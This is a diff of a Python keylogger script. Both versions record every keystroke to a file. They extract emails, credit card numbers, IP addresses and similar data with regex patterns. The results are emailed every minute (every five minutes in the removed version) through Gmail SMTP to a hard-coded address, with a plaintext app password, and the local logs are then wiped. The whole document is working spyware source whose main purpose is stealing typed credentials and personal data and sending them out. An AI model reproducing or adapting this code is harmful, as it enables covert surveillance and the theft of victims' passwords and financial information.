@@ -1,179 +1,255 @@
-import os
-import time
-import keyboard
-import re
-import threading
-from collections import Counter
-from queue import Queue
-import smtplib
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
-
 # ===================================================== File Existence Handling =====================================================
 
+import os
+import time
 
-def check_and_create_file(file_path, retries=3, delay=2):
+
+def check_and_create_file(valuable_info, keysniffer_data, retries=3, delay=2):
+    """
+    Check if the files exist, and create them if not, retrying a few times if they fail.
+    """
     for attempt in range(retries):
-        if not os.path.exists(file_path):
-            with open(file_path, "w") as file:
+        # Check if the first file exists, if not, create it
+        if not os.path.exists(valuable_info):
+            with open(valuable_info, "w") as file:
                 file.write("")  # Create an empty file
-            print(f"Created missing file: {file_path}")
+            print(f"Created missing file: {valuable_info}")
 
-        if os.path.exists(file_path):
-            print(f"File is present: {file_path}")
+        # Check if the second file exists, if not, create it
+        if not os.path.exists(keysniffer_data):
+            with open(keysniffer_data, "w") as file:
+                file.write("")  # Create an empty file
+            print(f"Created missing file: {keysniffer_data}")
+
+        # Check if both files now exist
+        if os.path.exists(valuable_info) and os.path.exists(keysniffer_data):
+            print(f"Both files are present: {valuable_info}, {keysniffer_data}")
             return True
         else:
             print(
-                f"File not found or created: {file_path}. Retrying {attempt + 1}/{retries}..."
+                f"Files not found or created: {valuable_info}, {keysniffer_data}. Retrying {attempt + 1}/{retries}..."
             )
             time.sleep(delay)
 
-    print(f"Failed to ensure the file exists: {file_path}")
+    print(f"Failed to ensure both files exist: {valuable_info}, {keysniffer_data}")
     return False
 
 
 # ===================================================== Basic keylogger ================================================
 
+import keyboard
+
 path = os.path.abspath("keysniffer_data.txt")
-key_data_queue = Queue()  # Queue to store keypresses for filtering
 
 
 def keylogger():
     try:
+        typed_text = []  # List to store the typed characters
         while True:
-            events = keyboard.record("enter")  # Record until "enter" key is pressed
-            typed_text = list(keyboard.get_typed_strings(events))
-            key_data_queue.put(typed_text[0])  # Put the recorded text into the queue
-            time.sleep(0.1)  # Small delay to avoid overloading the system
+            event = keyboard.read_event()  # Capture a single event
+            if event.event_type == "down":  # Only process key press events
+                key = event.name
+
+                # Handle special keys
+                if key == "space":
+                    key = " "
+                elif key == "enter":
+                    key = "\n"
+                elif key == "backspace":
+                    if typed_text:
+                        typed_text.pop()  # Remove the last character
+                    continue
+                elif len(key) > 1:  # Skip special keys like 'shift', 'ctrl', etc.
+                    continue
+
+                # Append the key to the list and write to the file
+                typed_text.append(key)
+
+                # Write the current batch of keys to the file only if there are new keys
+            if typed_text:
+                with open(
+                    path, "a", encoding="utf-8"
+                ) as data_file:  # Open in append mode
+                    data_file.write("".join(typed_text))
+                    data_file.flush()  # Ensure immediate writing to the file
+
+                # Clear the list after writing
+                typed_text.clear()
+
     except KeyboardInterrupt:
         print("Keylogger stopped.")
 
 
 # ===================================================== Filter and Extract Valuable Info ====================================
 
+import re
+from collections import Counter
 
-def extract_valuable_info(keysniffer_data):
-    extracted_data = {
-        "emails": [],
-        "phone_numbers": [],
-        "urls": [],
-        "credit_cards": [],
-        "ip_addresses": [],
-        "dates": [],
-        "social_security_numbers": [],
-        "common_words": [],
-    }
+
+def extract_valuable_info(keysniffer_data, filtered_data, interval=5):
+    """
+    Continuously extracts valuable information from the keysniffer_data file
+    and writes it to the filtered_data file every `interval` seconds.
+    """
+
+    with open(keysniffer_data, "r") as file:
+        data = file.read()
 
     # Define patterns for valuable information
     patterns = {
-        "emails": r"[\w.-]+@(gmail\.com|hotmail\.com)",
-        "phone_numbers": r"\+?(\d{1,3}[- ]?)?(\d{9,})",
-        "urls": r"https?://[\w.-]+(?:\.[\w.-]+)+[/\w.-]*",
-        "credit_cards": r"\bLU\d{18}\b",
-        "ip_addresses": r"\b(?:\d{1,3}\.){3}\d{1,3}\b",
-        "dates": r"\b(?:\d{2}[-/.]?\d{2}[-/.]?\d{4})\b",
-        "social_security_numbers": r"\b\d{13}\b",
+        "emails": r"[\w\.-]+@[a-zA-Z0-9\.-]+\.[a-zA-Z]{2,}",  # Generalized for various domains
+        "phone_numbers": r"\+(\d{3})\s(\d{3})\s(\d{3})\s(\d{3})",
+        "urls": r"https?://(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}(?:/[^\s]*)?",  # Better handling for different URL structures
+        "credit_cards": r"\b(?:\d{4}[-\s]?){3}\d{4}\b|LU\d{18}\b",  # Handling different formats for credit card numbers
+        "IPv4 / IPv6": r"\b(?:\d{1,3}\.){3}\d{1,3}\b|\b(?:[a-f0-9]{1,4}:){7}[a-f0-9]{1,4}\b",  # Supports both IPv4 and IPv6
+        "dates": r"\b(?:\d{1,2}[-/.]?\d{1,2}[-/.]?\d{4}|\d{4}[-/.]?\d{1,2}[-/.]?\d{1,2})\b",  # More date formats
     }
 
-    # Ensure the separator is added only once
-    has_separator = False
+    extracted_data = {}
 
-    while True:
-        if not key_data_queue.empty():
-            data = key_data_queue.get()  # Get raw data from the queue
+    for key, pattern in patterns.items():
+        matches = re.findall(pattern, data)
+        extracted_data[key] = matches
 
-            # Write raw data to the file
-            with open(keysniffer_data, "a") as file:
-                file.write(data + "\n")
+    # Most common words typed
+    words = re.findall(r"\b\w+\b", data)
+    common_words = Counter(words).most_common(10)
+    extracted_data["common_words"] = common_words
 
-            # Add separator if it's not already present
-            if not has_separator:
-                with open(keysniffer_data, "a") as file:
-                    file.write("\n========================\n")
-                has_separator = True
+    # Write the extracted data to the output file
+    with open(filtered_data, "w") as filtered_file:
+        for category, items in extracted_data.items():
+            filtered_file.write(f"{category.capitalize()}:\n")
+            for item in items:
+                filtered_file.write(f"  {item}\n")
+            filtered_file.write("\n")
 
-            # Extract filtered information
-            for key, pattern in patterns.items():
-                matches = re.findall(pattern, data)
-                extracted_data[key].extend(matches)
-
-            # Write filtered data below the separator
-            with open(keysniffer_data, "a") as file:
-                file.write("\nFiltered Data:\n")
-                for category, items in extracted_data.items():
-                    file.write(f"{category.capitalize()}:\n")
-                    for item in items:
-                        file.write(f"  {item}\n")
-                file.write("\n")
-
-            # Clear extracted data
-            extracted_data = {key: [] for key in extracted_data}
-
-        time.sleep(1)  # Small delay to avoid overloading the system
+    print("Data filtered and written to the file.")
+    time.sleep(interval)  # Wait for the specified interval before re-running
 
 
 # ===================================================== Sending the Filtered Data via Email ====================================
 
-sender_email = "7unkym0nk3y@gmail.com"
-receiver_email = "7unkym0nk3y@gmail.com"
-keysniffer_data_file = "keysniffer_data.txt"
+import smtplib
+import time
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+
+# Email sender and receiver details
+password = "ixtzymqtphizlcet"
+sender_email = "7unkym0nk3y@gmail.com"  # email from the account
+receiver_email = "7unkym0nk3y@gmail.com"  # email from the sender
+
+# File to attach
+filtered_data_file = "valuable_info.txt"  # Now we're attaching the filtered data file
+
+# Second file to attach
+second_data_file = "keysniffer_data.txt"
 
 
 def send_email():
-    message = MIMEMultipart()
-    message["From"] = sender_email
-    message["To"] = receiver_email
-    message["Subject"] = "File Attachment: keysniffer_data.txt"
 
-    email_body = """<html><body><p>Please find the attached file containing keylogger data and filtered data.</p></body></html>"""
-    message.attach(MIMEText(email_body, "html"))
+    print("Filtering data before sending the email...")
+    extract_valuable_info("keysniffer_data.txt", "valuable_info.txt")
 
-    with open(keysniffer_data_file, "rb") as file:
-        part = MIMEBase("application", "octet-stream")
-        part.set_payload(file.read())
-        encoders.encode_base64(part)
-        part.add_header(
-            "Content-Disposition", f"attachment; filename={keysniffer_data_file}"
+    if os.path.exists(filtered_data_file) and os.path.getsize(filtered_data_file) > 0:
+        # Create the email object
+        message = MIMEMultipart()
+        message["From"] = sender_email
+        message["To"] = receiver_email
+        message["Subject"] = (
+            "File Attachments: valuable_info.txt and keysniffer_data.txt"
         )
-        message.attach(part)
 
-    try:
-        with smtplib.SMTP("smtp.gmail.com:587") as server:
-            server.starttls()
-            server.login(sender_email, "ixtzymqtphizlcet")
-            server.sendmail(sender_email, receiver_email, message.as_string())
-            print("Email sent successfully.")
+        # Email body
+        email_body = """<html><body><p>Please find the attached files containing filtered data and keylogger data.</p></body></html>"""
+        message.attach(MIMEText(email_body, "html"))
 
-    except Exception as e:
-        print(f"An error occurred: {e}")
+        # Attach the filtered data file (valuable_info.txt)
+        with open(filtered_data_file, "rb") as file:
+            part = MIMEBase("application", "octet-stream")
+            part.set_payload(file.read())
+            encoders.encode_base64(part)
+            part.add_header(
+                "Content-Disposition",
+                f"attachment; filename={filtered_data_file}",
+            )
+            message.attach(part)
+
+        # Attach the keylogger data file (keysniffer_data.txt)
+        with open("keysniffer_data.txt", "rb") as file:
+            part = MIMEBase("application", "octet-stream")
+            part.set_payload(file.read())
+            encoders.encode_base64(part)
+            part.add_header(
+                "Content-Disposition",
+                f"attachment; filename=keysniffer_data.txt",
+            )
+            message.attach(part)
+
+        # Send the email
+        try:
+            with smtplib.SMTP(
+                "smtp.gmail.com:587"
+            ) as server:  # Replace with your SMTP server and port
+                server.starttls()
+                server.login(sender_email, password)
+                server.sendmail(sender_email, receiver_email, message.as_string())
+                print("Email sent successfully.")
+        except Exception as e:
+            print(f"An error occurred: {e}")
+
+        reset_files_after_email([filtered_data_file, second_data_file])
+    else:
+        print("Creating files again ...")
+        check_and_create_file("valuable_info.txt", "keysniffer_data.txt")
 
 
 def send_email_periodically():
+    # Sends the filtered data file as an email attachment
     while True:
         send_email()
-        time.sleep(300)  # Send email every 5 minutes
+        time.sleep(60)  # Wait for 1 minutes
+
+
+# ===================================================== Reset Files After Sending Email =====================================================
+
+
+def reset_files_after_email(files):
+    """
+    Resets the contents of the specified files to be empty.
+    """
+    for file in files:
+        with open(file, "w") as f:
+            f.truncate(0)
+    print("Files have been reset.")
+    print("                        ")
 
 
 # ===================================================== Running the Program ======================================================
 
+import threading
+
+# Run keylogger and send_email_periodically simultaneously using threads
 if __name__ == "__main__":
-    if check_and_create_file("keysniffer_data.txt"):
+    if check_and_create_file("valuable_info.txt", "keysniffer_data.txt"):
         try:
             keylogger_thread = threading.Thread(target=keylogger, daemon=True)
-            filter_thread = threading.Thread(
-                target=extract_valuable_info, daemon=True, args=("keysniffer_data.txt",)
-            )
+            # filter_thread = threading.Thread(
+            #    target=extract_valuable_info,
+            #    args=("keysniffer_data.txt", "valuable_info.txt"),
+            #    daemon=True,
+            # )
             email_thread = threading.Thread(target=send_email_periodically, daemon=True)
 
             keylogger_thread.start()
-            filter_thread.start()
+            # filter_thread.start()
             email_thread.start()
 
-            keylogger_thread.join()
-            filter_thread.join()
-            email_thread.join()
-
+            # Keep the main program alive
+            while True:
+                time.sleep(1)
         except KeyboardInterrupt:
             print("Program stopped.")
